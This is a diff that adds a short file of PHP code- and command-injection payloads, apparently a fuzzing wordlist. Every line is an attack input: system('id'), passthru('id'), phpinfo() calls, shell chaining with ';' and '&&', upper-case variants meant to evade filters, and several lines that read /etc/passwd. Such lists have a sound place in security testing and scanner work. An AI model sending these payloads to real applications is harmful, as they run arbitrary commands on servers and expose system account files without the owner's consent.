@@ -1,0 +1,24 @@
+system(%27id%27)
+phpinfo()
+system('id')
+phpinfo();id
+;system('id')
+;id
+;id;
+&&id
+;system('/usr/bin/id')
+phpinfo();system('cat /etc/passwd')
+;system('cat /etc/passwd')
+passthru('id')
+PASSTHRU('id')
+;SYSTEM('id')
+phpinfo();system('id')
+PHPINFO();SYSTEM('id')
+PHPINFO()
+PHPINFO();id
+system('id');phpinfo()
+SYSTEM('id');PHPINFO()
+print_r($_POST);system('id')
+PRINT_R($_POST);SYSTEM('id')
+system('cat /etc/passwd');
+;system('cat /etc/passwd')
